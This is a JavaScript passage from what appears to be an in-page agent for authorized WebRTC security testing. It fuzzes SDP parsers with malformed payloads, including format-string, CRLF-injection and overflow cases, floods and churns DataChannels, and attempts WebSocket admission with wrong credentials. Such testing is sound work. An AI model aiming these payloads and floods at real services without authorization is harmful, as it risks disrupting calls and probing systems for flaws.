        var ufrag = (offer.sdp.match(/a=ice-ufrag:(\S+)/) || [])[1] || "";
        var pwd = (offer.sdp.match(/a=ice-pwd:(\S+)/) || [])[1] || "";
        var key = ufrag + ":" + pwd, isReuse = seen[key] === true;
        if (isReuse) reused++; else { seen[key] = true; distinct++; }
        beacon({ type: "flood-result", commandId: command.id, index: index + 1, iceUfrag: ufrag, icePwd: pwd,
          reused: isReuse, detail: "Local renegotiation " + (index + 1) + "/" + cfg.count + " completed" });
      }
      beacon({ type: "signaling-flood-summary", commandId: command.id, attempts: cfg.count, distinctCredentials: distinct,
        reusedCredentials: reused,
        detail: cfg.count + " local ICE-restart renegotiation(s): " + distinct + " distinct ICE credential pair(s), " +
          reused + " reuse(s). Nothing was sent to the signaling server." });
      return "completed";
    } finally { try { pc.close(); } catch (e) {} }
  }

  function makeBaseOffer() {
    return Promise.resolve().then(function () {
      var pc = new NativePeerConnection({});
      pc.createDataChannel("sdp-fuzz-base");
      return Promise.resolve(pc.createOffer()).then(function (offer) {
        try { pc.close(); } catch (e) {}
        return offer && offer.sdp ? offer.sdp : "";
      }, function () { try { pc.close(); } catch (e) {} return ""; });
    }).catch(function () { return ""; }).then(function (sdp) {
      return sdp || "v=0\r\no=- 0 0 IN IP4 127.0.0.1\r\ns=-\r\nt=0 0\r\n" +
        "m=application 9 UDP/DTLS/SCTP webrtc-datachannel\r\nc=IN IP4 0.0.0.0\r\n" +
        "a=setup:actpass\r\na=fingerprint:sha-256 00\r\na=rtpmap:0 opus/48000\r\n";
    });
  }

  // Mutate every line of the latest observed application SDP with known SDP
  // attributes, malformed line types, integer overflow values and bounded long
  // values. The fixed cases add whole-description structural and size boundaries.
  function sdpFuzzCases(base) {
    var lines = base.split(/\r?\n/).filter(function (line, i, all) { return line.length || i < all.length - 1; });
    var cases = [{ label: "baseline-observed", sdp: base }];
    var perMutation = Array.from({ length: 7 }, function () { return []; });
    function changedLine(index, value, label, mutationIndex) {
      var changed = lines.slice();
      if (label === "deleted") changed.splice(index, 1); else changed[index] = value;
      perMutation[mutationIndex].push({ label: "line-" + (index + 1) + "-" + label, lineNumber: index + 1,
        mutatedLine: value, sdp: changed.join("\r\n") + "\r\n" });
    }
    lines.forEach(function (line, index) {
      var numeric = line.replace(/-?\d{1,20}/g, "999999999999999999999999999999");
      changedLine(index, "", "deleted", 0);
      changedLine(index, "a=rtpmap:127 opus/48000/2", "known-rtpmap", 1);
      changedLine(index, "a=fmtp:127 minptime=10;useinbandfec=1", "known-fmtp", 2);
      changedLine(index, "a=candidate:1 1 UDP 2122260223 127.0.0.1 9 typ host", "known-candidate", 3);
      changedLine(index, numeric === line ? line + " 999999999999999999999999999999" : numeric, "integer-overflow", 4);
      changedLine(index, line.slice(0, 128) + "X".repeat(4096), "long-attribute-4k", 5);
    });
    // Codec-focused mutations: rewrite each a=rtpmap / a=fmtp line with malformed
    // clock rates, channel counts, payload types, and known H.264/Opus parameter
    // payloads, so the parser is exercised per codec rather than only per line.
    lines.forEach(function (line, index) {
      if (/^a=rtpmap:/i.test(line)) {
        changedLine(index, "a=rtpmap:2147483648 H264/90000", "codec-payload-overflow", 6);
        changedLine(index, "a=rtpmap:127 opus/0/999999999", "codec-rate-channel-overflow", 6);
        changedLine(index, "a=rtpmap:", "codec-empty-rtpmap", 6);
      }
      if (/^a=fmtp:/i.test(line)) {
        changedLine(index, "a=fmtp:127 profile-level-id=FFFFFFFF;packetization-mode=99", "codec-h264-profile-overflow", 6);
        changedLine(index, "a=fmtp:127 max-fs=999999999;max-mbps=999999999;minptime=-1;useinbandfec=9", "codec-opus-fmtp-malformed", 6);
        changedLine(index, "a=fmtp:127 " + "x=1;".repeat(512) + "x=1", "codec-fmtp-long-params", 6);
      }
    });
    var firstMedia = (base.match(/^m=.*$/m) || ["m=application 9 UDP/DTLS/SCTP webrtc-datachannel"])[0];
    cases.push(
      { label: "empty", sdp: "" },
      { label: "whitespace-only", sdp: "   \r\n\t\r\n" },
      { label: "missing-v", sdp: lines.filter(function (l) { return l.indexOf("v=") !== 0; }).join("\r\n") + "\r\n" },
      { label: "missing-o", sdp: lines.filter(function (l) { return l.indexOf("o=") !== 0; }).join("\r\n") + "\r\n" },
      { label: "no-media", sdp: lines.filter(function (l) { return l.indexOf("m=") !== 0; }).join("\r\n") + "\r\n" },
      { label: "truncated-half", sdp: base.slice(0, Math.floor(base.length / 2)) },
      { label: "oversized-attribute", sdp: base + "a=" + "X".repeat(8192) + "\r\n" },
      { label: "overflow-64k", sdp: base + "a=x" + "X".repeat(65536) + "\r\n" },
      { label: "overflow-256k", sdp: base + "a=x" + "X".repeat(262144) + "\r\n" },
      { label: "many-attributes", sdp: base + "a=x\r\n".repeat(2000) },
      { label: "many-media", sdp: base + (firstMedia + "\r\n").repeat(500) },
      { label: "non-numeric-port", sdp: base.replace(/^(m=\S+ )\d+/m, "$1NaN") },
      { label: "huge-payload-type", sdp: base + "a=rtpmap:999999999 opus/48000\r\n" },
      { label: "control-chars", sdp: base + "a=x\u0000\u0007\u001b[31m\r\n" },
      { label: "unicode-session", sdp: base.replace(/^s=.*$/m, "s=💥‮evil") },
      { label: "format-specifiers", sdp: base + "a=label:%n%n%s%x%p\r\n" },
      { label: "crlf-injection", sdp: base + "a=x\r\na=injected:1\r\n\r\nm=bogus 0 X 0\r\n" },
      { label: "codec-h264-profile-overflow", sdp: base + "a=fmtp:99 profile-level-id=FFFFFFFF;level-asymmetry-allowed=99\r\n" },
      { label: "codec-opus-malformed", sdp: base + "a=fmtp:111 minptime=99999;useinbandfec=9;maxaveragebitrate=-1\r\n" },
      { label: "codec-rtpmap-long-codec", sdp: base.replace(/^a=rtpmap:.*$/m, "a=rtpmap:111 " + "A".repeat(4096) + "/0/0") },
      { label: "duplicate-critical", sdp: base + "\r\n" + base }
    );
    // Sample mutation families before exhausting the cap on long real-call SDP.
    // The baseline remains first; codec, structural and per-line cases all get a turn.
    var structural = cases.splice(1);
    var groups = [perMutation[0], perMutation[6], structural].concat(perMutation.slice(1, 6));
    var remaining = true;
    for (var offset = 0; remaining; offset++) {
      remaining = false;
      groups.forEach(function (group) {
        if (offset < group.length) { cases.push(group[offset]); remaining = true; }
      });
    }
    return cases;
  }

  async function runSdpFuzz(command) {
    var cfg = command.config;
    if (!cfg || ["offer", "answer"].indexOf(cfg.descriptionType) < 0 ||
      !Number.isInteger(cfg.maxCases) || cfg.maxCases < 1 || cfg.maxCases > 500) throw new Error("Invalid SDP fuzz settings");
    if (!NativePeerConnection) throw new Error("RTCPeerConnection is unavailable");
    var base = cfg.descriptionType === "offer" ? latestObservedOffer : latestObservedAnswer;
    if (!base && cfg.descriptionType === "answer") throw new Error("Answer fuzzing needs an observed answer. Negotiate a connection first.");
    if (!base) base = await makeBaseOffer();
    if (base.length > 262144) throw new Error("Observed SDP exceeds the 256 KiB seed limit; refusing to truncate the baseline.");
    var cases = sdpFuzzCases(base).slice(0, cfg.maxCases);
    var accepted = 0, rejected = 0, answersGenerated = 0, baselineOutcome = "unknown";
    for (var i = 0; i < cases.length; i++) {
      if (!await authorized(command)) return "cancelled";
      var c = cases[i];
      var pc = new NativePeerConnection({});
      var event = { type: "sdp-fuzz-result", commandId: command.id, index: i + 1, label: c.label,
        descriptionType: cfg.descriptionType, bytes: new TextEncoder().encode(c.sdp).byteLength,
        preview: c.sdp.slice(0, 300), tail: c.sdp.slice(-300) };
      if (c.lineNumber) { event.lineNumber = c.lineNumber; event.mutatedLine = c.mutatedLine; }
      var stage = cfg.descriptionType === "answer" ? "setup" : "parser";
      try {
        if (cfg.descriptionType === "answer") {
          pc.createDataChannel("sdp-fuzz-answer-control");
          var localOffer = await pc.createOffer();
          await pc.setLocalDescription(localOffer);
        }
        stage = "parser";
        await pc.setRemoteDescription({ type: cfg.descriptionType, sdp: c.sdp });
        if (i > 0) accepted++; event.outcome = "accepted";
        event.detail = "Case " + c.label + " (" + event.bytes + " bytes): accepted by setRemoteDescription()";
        if (cfg.descriptionType === "offer") {
          try {
            var answer = await pc.createAnswer();
            event.followupOutcome = "answer-generated";
            event.answerBytes = answer && answer.sdp ? answer.sdp.length : 0;
            if (i > 0) answersGenerated++;
          } catch (answerError) {
            event.followupOutcome = "answer-rejected";
            event.followupError = cleanError(answerError);
          }
        } else {
          event.followupOutcome = "not-run-for-answer-mode";
        }
      } catch (e) {
        if (i > 0 && stage === "parser") rejected++;
        event.outcome = stage === "parser" ? "rejected" : "setup-error";
        event.error = cleanError(e);
        event.detail = "Case " + c.label + " (" + event.bytes + " bytes): " + event.error;
      } finally { try { pc.close(); } catch (e) {} }
      await beacon(event);
      if (stage === "setup") throw new Error("Could not prepare answer-mode peer: " + event.error);
      if (i === 0) {
        baselineOutcome = event.outcome;
        if (baselineOutcome !== "accepted") throw new Error("Baseline SDP was rejected; mutations were not run. " + event.error);
      }
    }
    await beacon({ type: "sdp-fuzz-summary", commandId: command.id, cases: cases.length, mutations: cases.length - 1,
      baselineOutcome: baselineOutcome, accepted: accepted, rejected: rejected, answersGenerated: answersGenerated,
      detail: (cases.length - 1) + " mutations: " + accepted + " accepted, " + rejected + " rejected; " +
        answersGenerated + " accepted mutations also produced an answer. Baseline accepted separately. API acceptance is not proof of a vulnerability." });
    return "completed";
  }

  function intIn(value, min, max) { return Number.isInteger(value) && value >= min && value <= max; }

  // A runner transport: an open DataChannel or a registered Colibri WebSocket.
  // Sends use the native method so runner cases are not double-reported as app traffic.
  function resolveTarget(spec) {
    if (spec.transport === "colibri-ws") {
      var s = sockets.get(spec.socketId);
      if (!s) return null;
      return { transport: "colibri-ws", id: spec.socketId, label: "colibri-ws", pcId: "", peerKind: "jvb",
        ready: function () { return s.ws.readyState === 1; }, buffered: function () { return s.ws.bufferedAmount || 0; },
        state: function () { return { socket: wsState(s.ws) }; }, send: function (data) { s.send.call(s.ws, data); },
        close: function () { s.ws.close(); } };
    }
    var entry = channels.get(spec.channelId);
    if (!entry) return null;
    return { transport: "datachannel", id: spec.channelId, label: entry.dc.label, pcId: entry.pcId, peerKind: peerKind(entry.pc),
      ready: function () { return entry.dc.readyState === "open"; }, buffered: function () { return entry.dc.bufferedAmount || 0; },
      state: function () { var s = peerState(entry.pc); s.channel = entry.dc.readyState; return s; },
      send: function (data) { entry.send.call(entry.dc, data); }, close: function () { entry.dc.close(); } };
  }

  function targetFields(event, target, spec) {
    event.transport = spec.transport === "colibri-ws" ? "colibri-ws" : "datachannel";
    event.channelId = spec.channelId || ""; event.socketId = spec.socketId || "";
    if (target) { event.label = target.label; event.pc = target.pcId; event.peerKind = target.peerKind; }
    return event;
  }

  // Sequential runner cases. Each case is re-authorized, built from its parts,
  // measured in bytes, sent once, then given a settle window before the next.
  // The stage distinguishes browser rejection from queue acceptance; recipient
  // receipt and processing are established by other pages' marker reports.
  async function runDcSuite(command) {
    var cfg = command.config || {};
    if (!Array.isArray(cfg.cases) || cfg.cases.length < 1 || cfg.cases.length > 100) throw new Error("Invalid runner case list");
    if (!intIn(cfg.settleMs, 50, 10000) || !intIn(cfg.maxMessageBytes, 1, 1048576) || !intIn(cfg.maxTotalBytes, 1, 16777216) ||
      !intIn(cfg.maxBufferedAmount, 1, 16777216)) throw new Error("Invalid runner limits");
    var total = 0;
    for (var i = 0; i < cfg.cases.length; i++) {
      if (!await authorized(command)) return "cancelled";
      var c = cfg.cases[i] || {}, spec = c.transport ? c : cfg, target = resolveTarget(spec);
      var event = targetFields({ type: "dc-case", commandId: command.id, caseId: String(c.id || "").slice(0, 96),
        marker: String(c.marker || "").slice(0, 32), index: i + 1, kind: c.payload && c.payload.kind || "text" }, target, spec);
      if (!target) { event.stage = "blocked"; event.error = "Target channel or socket no longer exists"; await beacon(event); return "failed"; }
      event.stateBefore = target.state(); event.bufferedBefore = target.buffered();
      if (!target.ready()) { event.stage = "blocked"; event.error = "Target is not open"; await beacon(event); return "failed"; }
      if (event.bufferedBefore > cfg.maxBufferedAmount) { event.stage = "blocked"; event.error = "Send buffer is above the configured cap"; await beacon(event); return "failed"; }
      var data;
      try { data = buildPayload(c.payload, cfg.maxMessageBytes); }
      catch (e) { event.stage = "blocked"; event.error = "Payload not built: " + cleanError(e); await beacon(event); continue; }
      var bytes = sizeOf(data);
      event.bytes = bytes; event.preview = previewOf(data);
      if (typeof data === "string") { event.textHash = hash32(data); var envelope = parseEnvelope(data); if (envelope) event.payloadHash = envelope.payloadHash; }
      if (total + bytes > cfg.maxTotalBytes) { event.stage = "blocked"; event.error = "Run byte budget exhausted"; await beacon(event); return "failed"; }
      total += bytes;
      event.sentAt = Date.now();
      try { target.send(data); event.stage = "queued"; }
      catch (e) { event.stage = "browser-rejected"; event.error = cleanError(e); }
      event.bufferedAfter = target.buffered();
      await delay(intIn(c.settleMs, 50, 10000) ? c.settleMs : cfg.settleMs);
      event.settledAt = Date.now(); event.stateAfter = target.state(); event.bufferedSettled = target.buffered();
      event.detail = event.caseId + ": " + event.stage + " (" + bytes + " bytes" + (event.error ? "; " + event.error : "") + ")";
      await beacon(event);
      if (!target.ready()) return "failed";
    }
    return "completed";
  }

  // One bounded load step: a fixed message rate for a duration, or a burst.
  // Messages carry sequential markers so recipients can measure delivery and latency.
  async function runDcLoad(command) {
    var cfg = command.config || {};
    if (["rate", "burst"].indexOf(cfg.mode) < 0 || !/^wrtc[0-9a-z]{8}$/.test(cfg.markerStem || "") ||
      !intIn(cfg.maxMessages, 1, 10000) || !intIn(cfg.maxBytes, 1, 16777216) || !intIn(cfg.maxBufferedAmount, 1, 16777216) ||
      typeof cfg.prefix !== "string" || typeof cfg.suffix !== "string" || cfg.prefix.length + cfg.suffix.length > 16384 ||
      (cfg.mode === "rate" && (!intIn(cfg.rate, 1, 200) || !intIn(cfg.durationMs, 100, 60000))) ||
      (cfg.mode === "burst" && !intIn(cfg.count, 1, 1000))) throw new Error("Invalid load limits");
    var target = resolveTarget(cfg);
    if (!target || !target.ready()) throw new Error("Load target is not open");
    var sent = 0, rejected = 0, bytes = 0, maxBuffered = 0, seq = intIn(cfg.firstSeq, 0, 1000000) ? cfg.firstSeq : 0, first = seq;
    var stop = "", lastError = "", started = Date.now();
    function sendOne() {
      if (!target.ready()) { stop = "target-closed"; return false; }
      var buffered = target.buffered();
      if (buffered > maxBuffered) maxBuffered = buffered;
      if (buffered > cfg.maxBufferedAmount) { stop = "backpressure"; return false; }
      var marker = cfg.markerStem + ("000" + seq.toString(36)).slice(-4), text = cfg.prefix + marker + cfg.suffix, size = sizeOf(text);
      if (sent + rejected >= cfg.maxMessages || bytes + size > cfg.maxBytes) { stop = "budget"; return false; }
      seq++;
      try { target.send(text); sent++; bytes += size; } catch (e) { rejected++; lastError = cleanError(e); }
      return true;
    }
    if (cfg.mode === "burst") {
      for (var i = 0; i < cfg.count; i++) if (!sendOne()) break;
    } else {
      var interval = 1000 / cfg.rate, end = started + cfg.durationMs, due = started, lastAuth = started;
      while (Date.now() < end && !stop) {
        if (Date.now() - lastAuth >= 500) {
          if (!await authorized(command)) { stop = "cancelled"; break; }
          lastAuth = Date.now();
        }
        while (due <= Date.now() && Date.now() < end) { if (!sendOne()) break; due += interval; }
        if (!stop) await delay(Math.max(5, Math.min(100, Math.round(due - Date.now()))));
      }
    }
    await beacon(targetFields({ type: "dc-load-step", commandId: command.id, mode: cfg.mode, rate: cfg.rate || null,
      durationMs: cfg.durationMs || null, planned: cfg.mode === "burst" ? cfg.count : Math.round(cfg.rate * cfg.durationMs / 1000),
      sent: sent, rejected: rejected, bytes: bytes, maxBuffered: maxBuffered, bufferedEnd: target.buffered(), markerStem: cfg.markerStem,
      firstSeq: first, lastSeq: seq - 1, startedAt: started, endedAt: Date.now(), stopReason: stop, error: lastError,
      detail: cfg.mode + " step: " + sent + " sent, " + rejected + " rejected" + (stop ? "; stopped: " + stop : "") }, target, cfg));
    return stop === "cancelled" ? "cancelled" : "completed";
  }

  // Bounded channel churn on an application peer that already has a connected SCTP
  // association (so no renegotiation is triggered). Channels use the native factory.
  async function runDcChurn(command) {
    var cfg = command.config || {};
    if (["sequential", "concurrent"].indexOf(cfg.mode) < 0 || !intIn(cfg.iterations, 1, 64) || !intIn(cfg.openTimeoutMs, 500, 15000) ||
      !Array.isArray(cfg.variants) || cfg.variants.length < 1 || cfg.variants.length > 8) throw new Error("Invalid churn limits");
    var entry = peersSeen.find(function (e) { return e.pcId === cfg.pcId; });
    if (!entry) throw new Error("Peer " + cfg.pcId + " is not on this page");
    var pc = entry.pc;
    if (!pc.sctp || pc.sctp.state !== "connected") throw new Error("No connected SCTP association on " + cfg.pcId + "; creating channels would trigger renegotiation");
    var create = nativeCreateChannel.get(pc) || pc.createDataChannel;
    var allowed = ["ordered", "maxRetransmits", "maxPacketLifeTime", "protocol", "negotiated", "id"];
    function open(index) {
      var variant = cfg.variants[index % cfg.variants.length] || {}, options = {};
      allowed.forEach(function (k) { if (variant[k] !== undefined && variant[k] !== null) options[k] = variant[k]; });
      if (options.negotiated && Number.isInteger(options.id)) options.id = options.id + index;
      var label = typeof variant.label === "string" ? variant.label.slice(0, 65535) : "wrtc-churn-" + index;
      var result = { type: "dc-churn-result", commandId: command.id, pc: cfg.pcId, index: index + 1, variant: String(variant.name || ""),
        label: label.slice(0, 128), labelBytes: sizeOf(label), requested: options }, started = Date.now(), dc;
      try { dc = create.call(pc, label, options); }
      catch (e) { result.outcome = "create-rejected"; result.error = cleanError(e); return Promise.resolve(result); }
      result.streamId = dc.id; result.ordered = dc.ordered; result.maxRetransmits = dc.maxRetransmits;
      result.maxPacketLifeTime = dc.maxPacketLifeTime; result.negotiated = dc.negotiated; result.protocolBytes = sizeOf(dc.protocol || "");
      return new Promise(function (resolve) {
        var done = false;
        function finish(outcome, error) { if (done) return; done = true; clearTimeout(timer); result.outcome = outcome; if (error) result.error = error; result.openMs = Date.now() - started; result.dc = dc; resolve(result); }
        var timer = setTimeout(function () { finish("timeout"); }, cfg.openTimeoutMs);
        dc.addEventListener("open", function () { finish("open"); });
        dc.addEventListener("close", function () { finish("closed-before-open"); });
        dc.addEventListener("error", function (e) { finish("error", e && e.error ? cleanError(e.error) : "channel error"); });
        if (dc.readyState === "open") finish("open");
      });
    }
    function close(result) {
      if (result.dc) { try { result.dc.close(); } catch (e) {} result.finalState = result.dc.readyState; delete result.dc; }
      result.detail = "Channel " + result.index + " (" + (result.variant || "default") + "): " + result.outcome + (result.error ? " — " + result.error : "");
      return beacon(result);
    }
    var outcomes = { open: 0 }, list = [], cancelled = false;
    for (var i = 0; i < cfg.iterations; i++) {
      if (!await authorized(command)) { cancelled = true; break; }
      var result = await open(i);
      outcomes[result.outcome] = (outcomes[result.outcome] || 0) + 1;
      if (cfg.mode === "concurrent") list.push(result); else { await close(result); await delay(100); }
    }
    for (var j = 0; j < list.length; j++) await close(list[j]);
    await beacon({ type: "dc-churn-summary", commandId: command.id, pc: cfg.pcId, mode: cfg.mode, attempted: cfg.iterations,
      outcomes: outcomes, maxChannels: finiteNumber(pc.sctp.maxChannels), connectionState: pc.connectionState, sctpState: pc.sctp.state,
      detail: cfg.mode + " churn: " + (outcomes.open || 0) + "/" + cfg.iterations + " channel(s) opened; peer " + pc.connectionState });
    return cancelled ? "cancelled" : "completed";
  }

  // Session health: peer, channel and socket states plus DataChannel and media
  // statistics, compared by Burp before and after each case group or load step.
  async function runDcHealth(command) {
    var peers = [];
    var live = peersSeen.slice(-16);
    for (var i = 0; i < live.length; i++) {
      var pc = live[i].pc, item = peerState(pc);
      item.pcId = live[i].pcId; item.kind = peerKind(pc);
      if (pc.connectionState !== "closed" && pc.getStats) {
        try {
          var report = await pc.getStats(null), media = { packetsReceived: 0, packetsLost: 0, framesDecoded: 0, framesDropped: 0, jitterMax: 0 }, data = [];
          report.forEach(function (s) {
            if (s.type === "inbound-rtp" && !s.isRemote) {
              media.packetsReceived += statNumber(s.packetsReceived) || 0; media.packetsLost += statNumber(s.packetsLost) || 0;
              media.framesDecoded += statNumber(s.framesDecoded) || 0; media.framesDropped += statNumber(s.framesDropped) || 0;
              if (typeof s.jitter === "number" && s.jitter > media.jitterMax) media.jitterMax = s.jitter;
              if (typeof s.framesPerSecond === "number") media.framesPerSecond = Math.max(media.framesPerSecond || 0, s.framesPerSecond);
            } else if (s.type === "candidate-pair" && (s.selected || s.nominated) && s.state === "succeeded" && typeof s.currentRoundTripTime === "number") {
              item.rttMs = Math.round(s.currentRoundTripTime * 1000);
            } else if (s.type === "data-channel") {
              data.push({ label: s.label, protocol: s.protocol, state: s.state, messagesSent: statNumber(s.messagesSent),
                bytesSent: statNumber(s.bytesSent), messagesReceived: statNumber(s.messagesReceived), bytesReceived: statNumber(s.bytesReceived) });
            } else if (s.type === "peer-connection") {
              item.dataChannelsOpened = statNumber(s.dataChannelsOpened); item.dataChannelsClosed = statNumber(s.dataChannelsClosed);
            }
          });
          item.media = media; item.dataChannels = data.slice(0, 16);
        } catch (e) { item.statsError = cleanError(e); }
      }
      peers.push(item);
    }
    var channelList = Array.from(channels.entries()).map(function (pair) { return channelSummary(pair[0], pair[1]); });
    var socketList = Array.from(sockets.entries()).map(function (pair) { return socketSummary(pair[0], pair[1]); });
    await beacon({ type: "dc-health", commandId: command.id, peers: peers, channels: channelList, sockets: socketList,
      pageErrors: pageErrorCount, t: Date.now(), detail: peers.length + " peer(s), " + channelList.filter(function (c) { return c.state === "open"; }).length +
        " open channel(s), " + socketList.filter(function (s) { return s.state === "open"; }).length + " open Colibri socket(s)" });
    return "completed";
  }

  // Fresh Colibri WebSocket admission attempt with a tester-chosen URL (wrong pwd,
  // another conference or endpoint, or a URL from an ended session). The socket
  // is unwrapped, closed afterwards and never used by the application.
  async function runWsAdmission(command) {
    var cfg = command.config || {};
    if (!NativeWebSocket) throw new Error("WebSocket is unavailable in this page");
    if (!/^wss?:\/\//i.test(cfg.url || "") || cfg.url.length > 4096 || !intIn(cfg.timeoutMs, 1000, 15000) ||
      (cfg.send !== undefined && (typeof cfg.send !== "string" || cfg.send.length > 16384))) throw new Error("Invalid WebSocket admission settings");
    var started = Date.now(), messages = 0, first = "", opened = false, code = null, reason = "", ws;
    try { ws = new NativeWebSocket(cfg.url); } catch (e) { throw new Error("WebSocket constructor rejected the URL: " + cleanError(e)); }
    var outcome = await new Promise(function (resolve) {
      var timer = setTimeout(function () { resolve(opened ? "open-timeout" : "connect-timeout"); }, cfg.timeoutMs);
      ws.addEventListener("open", function () { opened = true; if (cfg.send) { try { ws.send(cfg.send); } catch (e) {} } });
      ws.addEventListener("message", function (e) {
        messages++;
        if (!first) first = typeof e.data === "string" ? e.data.slice(0, 2048) : "[binary]";
        clearTimeout(timer); resolve("message");
      });
      ws.addEventListener("close", function (e) { code = e && e.code; reason = e && e.reason || ""; clearTimeout(timer); resolve("closed"); });
      ws.addEventListener("error", function () {});
    });
    try { ws.close(); } catch (e) {}
    var envelope = parseEnvelope(first);
    await beacon({ type: "ws-admission-result", commandId: command.id, caseId: String(cfg.caseId || "").slice(0, 96), url: cfg.url,
      opened: opened, outcome: outcome, closeCode: code, closeReason: String(reason).slice(0, 256), messages: messages,
      firstMessage: first, firstClass: envelope ? envelope.colibriClass : "", elapsedMs: Date.now() - started,
      detail: "Admission " + (opened ? "opened" : "not opened") + "; " + outcome + (envelope && envelope.colibriClass ? "; first " + envelope.colibriClass : "") });
    return "completed";
  }

  // Close the application's own transport and measure whether the page reconnects.
  async function runTransportAction(command) {
    var cfg = command.config || {};
    if (["close-ws", "close-channel"].indexOf(cfg.action) < 0 || !intIn(cfg.waitMs, 1000, 30000)) throw new Error("Invalid transport action");
    var spec = cfg.action === "close-ws" ? { transport: "colibri-ws", socketId: cfg.socketId } : { channelId: cfg.channelId };
    var target = resolveTarget(spec);
    if (!target || !target.ready()) throw new Error("Transport is not open");
    var before = cfg.action === "close-ws" ? Array.from(sockets.keys()) : Array.from(channels.keys()), label = target.label;
    var closedAt = Date.now(), reopened = "", reopenMs = null;
    target.close();
    while (Date.now() - closedAt < cfg.waitMs) {
      await delay(250);
      if (!await authorized(command)) return "cancelled";
      var fresh = cfg.action === "close-ws"
        ? Array.from(sockets.entries()).find(function (p) { return before.indexOf(p[0]) < 0 && p[1].ws.readyState === 1; })
        : Array.from(channels.entries()).find(function (p) { return before.indexOf(p[0]) < 0 && p[1].dc.readyState === "open" && p[1].dc.label === label; });
      if (fresh) { reopened = fresh[0]; reopenMs = Date.now() - closedAt; break; }
    }
    await beacon({ type: "transport-action-result", commandId: command.id, caseId: String(cfg.caseId || "").slice(0, 96), action: cfg.action,
      closed: target.id, reopened: reopened, reopenMs: reopenMs, closedAt: closedAt,
      detail: cfg.action + " " + target.id + ": " + (reopened ? "application reopened " + reopened + " after " + reopenMs + " ms" : "no replacement within " + cfg.waitMs + " ms") });
    return "completed";
  }

  try { Object.defineProperty(window, "__wrtcAgentId", { value: AGENT_ID, configurable: false, enumerable: false, writable: false }); } catch (e) {}
  try { wrapPeerConnection(); } catch (e) {}
  try { wrapWebSocket(); } catch (e) {}
  try { watchPageErrors(); } catch (e) {}
  try { wrapGetUserMedia(); } catch (e) {}
  try { installCanary(); } catch (e) {}
  try { wrapMessaging(); } catch (e) {}
  beacon({ type: "installed", detail: "agent " + AGENT_VERSION, private: false });
  if (typeof window.addEventListener === "function") window.addEventListener("pagehide", function () { unloading = true; });
  pollCommands();
})();
